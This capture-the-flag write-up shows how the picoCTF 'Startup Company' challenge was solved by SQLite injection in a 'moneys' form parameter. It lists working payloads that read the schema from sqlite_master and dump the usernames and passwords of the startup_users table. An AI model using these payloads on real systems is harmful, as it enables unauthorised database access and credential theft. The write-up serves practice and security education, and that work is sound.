<hr />

<h2>description: SQLite injection</h2>

<h1>Startup Company (180)</h1>

<h2>Problem</h2>

<p>Do you want to fund my startup? </p>

<p>{% embed url="http://mercury.picoctf.net:5070/" %}</p>

<h2>Solution</h2>

<p><img src="../../.gitbook/assets/e48e746db6734b4faa91e2a7cd354ce9.png" alt="" /></p>

<p>The query probably looks something like:</p>

<p><code>sql
UPDATE some_table
SET 
    latest_contribution = &lt;POST.moneys&gt;
WHERE
    user_id = &lt;SESSION.user_id&gt;
</code></p>

<p>So we can get information displayed in the green text by manipulating the <code>moneys=</code> parameter:</p>

<p><img src="../../.gitbook/assets/69736eaa20634168b28afd74b366f2bf.png" alt="" /></p>

<p>The SQLite version is 3.22.0:</p>

<p><img src="../../.gitbook/assets/71b28b0ba90c4d118356b410cd704bb7.png" alt="" /></p>

<h3>Getting Table Names</h3>

<p><code>captcha=23&amp;moneys=' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master)</code></p>

<p>Note that <code>GROUP_CONCAT</code> is required to concatenate all the <code>tbl_name</code> values into a single string. Otherwise, we might miss out on some valuable data.</p>

<p><img src="../../.gitbook/assets/bb2a73e36a344a9e9120b9bd82021c73.png" alt="" /></p>

<h3>Getting Column Names</h3>

<p><code>captcha=53&amp;moneys='|| (SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='startup_users');</code></p>

<p><img src="../../.gitbook/assets/f6198ce6109f44f1ba1d30543bf9c6ba.png" alt="" /></p>

<h3>Dumping Data</h3>

<p><code>captcha=36&amp;moneys='|| (SELECT GROUP_CONCAT(nameuser) FROM startup_users);</code></p>

<p><img src="../../.gitbook/assets/3f58fc451ff04cad9192181c09eacc26.png" alt="" /></p>

<p>Indeed, our flag is hidden in the <code>wordpass</code> value for the <code>the_real_flag</code> user!</p>

<p><code>captcha=66&amp;moneys='|| (SELECT GROUP_CONCAT(wordpass) FROM startup_users);</code></p>

<p><img src="../../.gitbook/assets/ae414d1d97154c6998412d1746e9862f.png" alt="" /></p>
